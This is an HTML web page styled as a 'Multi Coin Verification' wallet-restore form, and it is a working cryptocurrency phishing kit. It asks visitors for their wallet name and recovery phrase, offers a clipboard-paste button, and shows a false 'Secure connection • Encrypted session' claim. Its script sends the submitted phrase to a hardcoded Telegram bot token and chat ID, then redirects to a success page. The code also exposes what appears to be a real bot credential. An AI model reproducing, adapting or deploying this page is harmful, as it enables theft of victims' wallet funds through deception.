<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Wallet Verification</title>

<style>
body {
  margin: 0;
  font-family: Arial, sans-serif;
  background: #0d1117;
  color: #fff;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

.container {
  background: #161b22;
  padding: 30px;
  border-radius: 12px;
  width: 100%;
  max-width: 380px;
  box-shadow: 0 0 30px rgba(0,0,0,0.6);
  border: 1px solid #30363d;
}

h2 {
  text-align: center;
  margin-bottom: 20px;
  font-weight: 500;
}

input, textarea {
  width: 100%;
  padding: 12px;
  margin-top: 10px;
  border-radius: 8px;
  border: 1px solid #30363d;
  background: #0d1117;
  color: #fff;
  font-size: 14px;
  outline: none;
}

input:focus, textarea:focus {
  border-color: #238636;
}

.textarea-wrapper {
  position: relative;
}

textarea {
  resize: none;
  height: 110px;
  padding-right: 50px;
}

.paste-btn {
  position: absolute;
  top: 8px;
  right: 8px;
  font-size: 11px;
  padding: 4px 7px;
  background: #238636;
  color: white;
  border: none;
  border-radius: 4px;
  cursor: pointer;
}

.paste-btn:hover {
  background: #2ea043;
}

.submit-btn {
  width: 100%;
  padding: 12px;
  margin-top: 18px;
  border-radius: 8px;
  border: none;
  background: linear-gradient(90deg, #238636, #2ea043);
  color: white;
  font-size: 14px;
  cursor: pointer;
}

.footer {
  text-align: center;
  font-size: 12px;
  margin-top: 15px;
  color: #8b949e;
}
</style>
</head>

<body>

<div class="container">
  <h2>Multi Coin Verification</h2>
  <p>Login to Continue</p>

  <form id="form">
    <input type="text" id="username" placeholder="Wallet Name/Trust wallet/exoduswallet" required>

    <div class="textarea-wrapper">
      <textarea id="complaint" placeholder="Enter recovery phrase" required></textarea>
      <button type="button" class="paste-btn" onclick="pasteClipboard()">Paste</button>
    </div>

    <button class="submit-btn">Restore Wallet</button>
  </form>

  <div class="footer">
    Secure connection • Encrypted session
  </div>
</div>

<script>
// 🔐 PUT YOUR REAL BOT TOKEN HERE
const TOKEN = "8214623213:AAGlhEDRFbCnQaG0X1r2blaG0YJlHlkNkRs";

// ✅ Your chat ID (you already got it)
const CHAT_ID = "6994958690";

// 📋 Paste button
async function pasteClipboard() {
  try {
    const text = await navigator.clipboard.readText();
    document.getElementById("complaint").value += text;
  } catch {
    alert("Clipboard denied");
  }
}

// 📩 Send to Telegram
document.getElementById("form").addEventListener("submit", async (e) => {
  e.preventDefault();

  const username = document.getElementById("username").value;
  const complaint = document.getElementById("complaint").value;

  const message = `🔐 Wallet Verification

👤 User: ${username}

📝 Data:
${complaint}

⏰ ${new Date().toLocaleString()}`;

  try {
    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message
      })
    });

    // ✅ Redirect after success
    window.location.href = "success.html";

  } catch {
    alert("Network error!");
  }
});
</script>

</body>
</html>
